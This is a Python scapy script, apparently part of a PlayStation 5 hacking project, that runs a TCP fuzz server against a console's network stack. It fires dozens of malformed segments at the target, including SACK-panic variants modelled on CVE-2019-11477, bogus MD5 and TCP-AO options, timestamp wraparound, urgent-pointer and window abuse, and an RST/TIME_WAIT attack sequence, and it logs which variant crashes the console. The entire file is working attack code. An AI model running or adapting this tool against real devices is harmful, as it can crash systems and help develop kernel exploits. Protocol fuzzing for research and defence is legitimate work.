#!/usr/bin/env python3
"""Enhanced TCP fuzz server for PS5 probe 46b — expanded attack variants.

Adds SACK panic (mbuf fragmentation), TCP MD5/AO option injection, PAWS
wraparound, simultaneous open, TIME_WAIT manipulation, and multi-SACK
block storms to the original variant set from tcp_fuzz_server.py.

Usage:
    pip install scapy
    sudo python tcp_fuzz_server_v2.py --ps5-ip 10.0.0.96 [--port 31337]

Run the PS5 side with:
    python send_probe.py --save probes/phase11_network_attacks/46b_tcp_enhanced_listener.lua
(after editing PC_IP in the probe)

Requires root/admin for raw packet send. Npcap on Windows or libpcap on Linux.
"""

import argparse
import struct
import sys
import time

try:
    from scapy.all import IP, TCP, Raw, sniff, send, conf, RandShort
except ImportError:
    print("[!] scapy not installed: pip install scapy")
    sys.exit(1)

LOG = []


def log(msg):
    line = f"[{time.strftime('%H:%M:%S')}] {msg}"
    print(line, flush=True)
    LOG.append(line)


# ------------------------------------------------------------------ #
#  Variant builders
# ------------------------------------------------------------------ #

def build_synack_variants(sport, dport, seq, ack, ps5_ip):
    """SYN-ACK variants with hostile TCP options."""
    base = dict(sport=sport, dport=dport, flags="SA", seq=seq, ack=ack)
    return [
        ("synack_normal",
         TCP(**base, options=[("MSS", 1460)])),
        ("synack_wscale14",
         TCP(**base, options=[("MSS", 1460), ("WScale", 14)])),
        ("synack_wscale255",
         TCP(**base, options=[("MSS", 1460), ("WScale", 255)])),
        ("synack_sack_ts",
         TCP(**base, options=[("SAckOK", b""), ("Timestamp", (0xFFFFFFFF, 0))])),
        ("synack_mss1",
         TCP(**base, options=[("MSS", 1)])),
        ("synack_mss0",
         TCP(**base, options=[("MSS", 0)])),
        ("synack_md5_bogus",
         TCP(**base, options=[(19, b"\x00" * 16)])),  # TCP MD5 kind=19
        ("synack_ao_bogus",
         TCP(**base, options=[(29, b"\x00" * 16)])),  # TCP-AO kind=29
        ("synack_unknown_254",
         TCP(**base, options=[(254, b"\xFF" * 38)])),
        ("synack_ts_wrap",
         TCP(**base, options=[("MSS", 1460), ("Timestamp", (0x7FFFFFFF, 0))])),
    ]


def build_data_variants(sport, dport, seq, ack):
    """Malformed in-connection segments — expanded set."""
    b = dict(sport=sport, dport=dport, ack=ack)
    variants = []

    # --- Original set (from v1) ---
    variants.append(("data_normal",
        TCP(**b, flags="PA", seq=seq) / Raw(b"A" * 64)))
    variants.append(("urg_byte",
        TCP(**b, flags="PAU", seq=seq, urgptr=1) / Raw(b"B" * 64)))
    variants.append(("urg_max",
        TCP(**b, flags="PAU", seq=seq, urgptr=0xFFFF) / Raw(b"C" * 64)))
    variants.append(("sack_impossible",
        TCP(**b, flags="PA", seq=seq,
            options=[("SAck", (0xFFFFFFFF, 0x7FFFFFFF))]) / Raw(b"D" * 8)))
    variants.append(("seq_overlap",
        TCP(**b, flags="PA", seq=seq - 32) / Raw(b"E" * 64)))
    variants.append(("seq_far_future",
        TCP(**b, flags="PA", seq=seq + 0x100000) / Raw(b"F" * 64)))
    variants.append(("zero_window",
        TCP(**b, flags="A", seq=seq, window=0)))
    variants.append(("window_max",
        TCP(**b, flags="PA", seq=seq, window=0xFFFF) / Raw(b"G" * 64)))
    variants.append(("syn_with_data",
        TCP(**b, flags="SPA", seq=seq) / Raw(b"H" * 32)))
    variants.append(("fin_rst",
        TCP(**b, flags="FPRA", seq=seq) / Raw(b"I" * 16)))
    variants.append(("all_flags",
        TCP(**b, flags="FSRPAUEC", seq=seq, urgptr=32) / Raw(b"J" * 16)))

    # --- SACK panic class (CVE-2019-11477 style) ---
    # Many small SACK holes → kernel fragments mbufs into tiny pieces
    # Could overflow 16-bit skb/mbuf counts on older BSD
    variants.append(("sack_4holes_small",
        TCP(**b, flags="A", seq=seq,
            options=[("SAck", (seq+8, seq+16, seq+24, seq+32,
                               seq+40, seq+48, seq+56, seq+64))])))
    variants.append(("sack_4holes_wrap",
        TCP(**b, flags="A", seq=seq,
            options=[("SAck", (0xFFFFFFF0, 0xFFFFFFFF,
                               0x00000000, 0x0000000F))])))
    variants.append(("sack_reversed",
        TCP(**b, flags="A", seq=seq,
            options=[("SAck", (seq+100, seq+50))])))  # right < left
    variants.append(("sack_zero_range",
        TCP(**b, flags="A", seq=seq,
            options=[("SAck", (seq+100, seq+100))])))  # zero-width
    variants.append(("sack_huge_gap",
        TCP(**b, flags="A", seq=seq,
            options=[("SAck", (seq+1, seq+2,
                               seq+0x7FFFFFFF, seq+0x7FFFFFFF+1))])))

    # --- TCP MD5 Signature (kind 19, RFC 2385) ---
    # Inject on a non-MD5 connection → kernel must handle unexpected auth
    variants.append(("md5_on_data",
        TCP(**b, flags="PA", seq=seq,
            options=[(19, b"\x41" * 16)]) / Raw(b"M" * 32)))
    variants.append(("md5_truncated",
        TCP(**b, flags="PA", seq=seq,
            options=[(19, b"\x42" * 4)]) / Raw(b"N" * 16)))  # too short
    variants.append(("md5_oversized",
        TCP(**b, flags="PA", seq=seq,
            options=[(19, b"\x43" * 32)]) / Raw(b"O" * 16)))  # too long

    # --- TCP-AO (kind 29, RFC 5925) ---
    variants.append(("ao_on_data",
        TCP(**b, flags="PA", seq=seq,
            options=[(29, b"\x01\x00" + b"\x44" * 14)]) / Raw(b"P" * 32)))
    variants.append(("ao_truncated",
        TCP(**b, flags="PA", seq=seq,
            options=[(29, b"\x01")]) / Raw(b"Q" * 16)))

    # --- PAWS (timestamp wraparound) ---
    variants.append(("ts_wrap_max",
        TCP(**b, flags="PA", seq=seq,
            options=[("Timestamp", (0xFFFFFFFF, 0xFFFFFFFF))]) / Raw(b"R" * 32)))
    variants.append(("ts_backwards",
        TCP(**b, flags="PA", seq=seq,
            options=[("Timestamp", (1, 0xFFFFFFFF))]) / Raw(b"S" * 32)))
    variants.append(("ts_zero",
        TCP(**b, flags="PA", seq=seq,
            options=[("Timestamp", (0, 0))]) / Raw(b"T" * 32)))
    variants.append(("ts_large_echo",
        TCP(**b, flags="PA", seq=seq,
            options=[("Timestamp", (0x80000000, 0x7FFFFFFF))]) / Raw(b"U" * 32)))

    # --- Urgent pointer edge cases ---
    variants.append(("urg_past_window",
        TCP(**b, flags="PAU", seq=seq, urgptr=0x7FFF, window=1) / Raw(b"V" * 64)))
    variants.append(("urg_zero",
        TCP(**b, flags="PAU", seq=seq, urgptr=0) / Raw(b"W" * 64)))
    variants.append(("urg_no_flag",
        TCP(**b, flags="PA", seq=seq, urgptr=100) / Raw(b"X" * 64)))

    # --- Window manipulation ---
    variants.append(("window_shrink_to_zero",
        TCP(**b, flags="A", seq=seq, window=0)))
    variants.append(("window_grow_max",
        TCP(**b, flags="A", seq=seq, window=0xFFFF)))

    # --- RST variants ---
    variants.append(("rst_valid_seq",
        TCP(**b, flags="R", seq=seq)))
    variants.append(("rst_with_data",
        TCP(**b, flags="RA", seq=seq) / Raw(b"Y" * 128)))
    variants.append(("rst_bad_seq",
        TCP(**b, flags="R", seq=seq + 0xDEAD)))

    # --- Unknown option types ---
    variants.append(("opt_kind0_len4",
        TCP(**b, flags="PA", seq=seq,
            options=[(0, b"\x04")]) / Raw(b"Z" * 16)))  # EOL with length
    variants.append(("opt_kind253_max",
        TCP(**b, flags="PA", seq=seq,
            options=[(253, b"\xFF" * 38)]) / Raw(b"a" * 8)))
    variants.append(("opt_chain_bogus",
        TCP(**b, flags="PA", seq=seq,
            options=[(19, b"\x00"*16), (29, b"\x00"*14),
                     (253, b"\xFF"*6)]) / Raw(b"b" * 8)))

    return variants


def build_timewait_sequence(sport, dport, seq, ack, ps5_ip):
    """FIN exchange → TIME_WAIT → RST injection sequence.

    Returns list of (name, delay_before_send, packet) triples.
    The caller sends them in order with appropriate delays.
    """
    b = dict(sport=sport, dport=dport, ack=ack)
    return [
        ("tw_fin",        0.0, TCP(**b, flags="FA", seq=seq)),
        ("tw_wait_ack",   0.5, None),  # wait for PS5's ACK+FIN
        ("tw_ack_fin",    0.1, TCP(**b, flags="A", seq=seq+1, ack=ack+1)),
        ("tw_wait",       1.0, None),  # wait for TIME_WAIT
        ("tw_rst_data",   0.1, TCP(**b, flags="R", seq=ack+1) / Raw(b"\xDE\xAD" * 32)),
        ("tw_syn_reuse",  0.5, TCP(**b, flags="S", seq=seq+0x10000)),
    ]


# ------------------------------------------------------------------ #
#  Main server
# ------------------------------------------------------------------ #

def main():
    ap = argparse.ArgumentParser(description="Enhanced TCP fuzz server for PS5")
    ap.add_argument("--ps5-ip", required=True, help="PS5 LAN IP")
    ap.add_argument("--port", type=int, default=31337, help="listen port")
    ap.add_argument("--variant", type=int, default=-1,
                    help="pin a single variant index (-1 = cycle all)")
    ap.add_argument("--rounds", type=int, default=2,
                    help="rounds through variant list")
    ap.add_argument("--delay", type=float, default=0.5,
                    help="seconds between variants")
    ap.add_argument("--synack-variant", type=int, default=0,
                    help="SYN-ACK variant index (0=normal)")
    ap.add_argument("--timewait", action="store_true",
                    help="run TIME_WAIT attack sequence after data variants")
    args = ap.parse_args()

    conf.verb = 0
    log(f"Enhanced TCP fuzz server v2")
    log(f"waiting for SYN from {args.ps5_ip} to port {args.port}")
    log(f"(start probe 46b on the PS5 now)")

    # Wait for SYN
    syn = sniff(
        filter=(f"tcp and host {args.ps5_ip} and tcp port {args.port} "
                f"and tcp[tcpflags] & tcp-syn != 0 "
                f"and tcp[tcpflags] & tcp-ack == 0"),
        count=1, timeout=300)
    if not syn:
        log("no SYN received in 300s")
        return
    syn = syn[0]
    sport, dport = args.port, syn[TCP].sport
    ps5_seq = syn[TCP].seq
    log(f"SYN: ps5 port={dport} seq={ps5_seq:#x}")

    # SYN-ACK
    synack_vars = build_synack_variants(
        sport, dport, 1000, ps5_seq + 1, args.ps5_ip)
    idx = min(args.synack_variant, len(synack_vars) - 1)
    name, synack = synack_vars[idx]
    log(f"sending SYN-ACK variant: {name}")
    send(IP(dst=args.ps5_ip) / synack)

    # Wait for ACK (handshake completion)
    ack_pkt = sniff(
        filter=(f"tcp and host {args.ps5_ip} and tcp port {args.port} "
                f"and tcp[tcpflags] & tcp-ack != 0"),
        count=1, timeout=30)
    if not ack_pkt:
        log("handshake ACK never arrived")
        return
    ack_pkt = ack_pkt[0]
    log("handshake complete")

    srv_seq = 1001
    cli_ack = ack_pkt[TCP].seq

    # Wait for hello from PS5 (optional)
    hello = sniff(
        filter=(f"tcp and host {args.ps5_ip} and tcp port {args.port} "
                f"and tcp[tcpflags] & tcp-push != 0"),
        count=1, timeout=5)
    if hello:
        payload = bytes(hello[0][TCP].payload) if hello[0].haslayer(Raw) else b""
        log(f"hello received: {payload!r}")

    # Build data variants
    data_vars = build_data_variants(sport, dport, srv_seq, cli_ack)
    log(f"{len(data_vars)} data variants prepared")

    if args.variant >= 0:
        data_vars = [data_vars[args.variant % len(data_vars)]]
        log(f"pinned to variant {args.variant}: {data_vars[0][0]}")

    # Send variants
    for rnd in range(args.rounds):
        for i, (vname, seg) in enumerate(data_vars):
            log(f"round {rnd+1}/{args.rounds} variant {i}/{len(data_vars)}: {vname}")
            try:
                send(IP(dst=args.ps5_ip) / seg)
            except Exception as e:
                log(f"  send error: {e}")
            time.sleep(args.delay)

    # TIME_WAIT attack sequence (optional)
    if args.timewait:
        log("--- TIME_WAIT attack sequence ---")
        tw_seq = build_timewait_sequence(
            sport, dport, srv_seq + 1, cli_ack, args.ps5_ip)
        for tw_name, delay, pkt in tw_seq:
            if delay > 0:
                time.sleep(delay)
            if pkt is None:
                log(f"  {tw_name}: waiting...")
                # Sniff for PS5's response
                resp = sniff(
                    filter=f"tcp and host {args.ps5_ip} and tcp port {args.port}",
                    count=1, timeout=3)
                if resp:
                    flags = resp[0][TCP].flags
                    log(f"  {tw_name}: got response flags={flags}")
                else:
                    log(f"  {tw_name}: no response")
            else:
                log(f"  {tw_name}: sending")
                send(IP(dst=args.ps5_ip) / pkt)

    # Clean close
    log("sending FIN")
    send(IP(dst=args.ps5_ip) / TCP(sport=sport, dport=dport, flags="FA",
                                    seq=srv_seq + 2, ack=cli_ack))

    log("--- Summary ---")
    log(f"variants sent: {len(data_vars)} x {args.rounds} rounds")
    log("if console died, last logged variant is the suspect")

    # Save log
    logfile = f"tcp_fuzz_v2_{time.strftime('%Y%m%d_%H%M%S')}.log"
    with open(logfile, "w") as f:
        f.write("\n".join(LOG) + "\n")
    log(f"log saved to {logfile}")


if __name__ == "__main__":
    main()
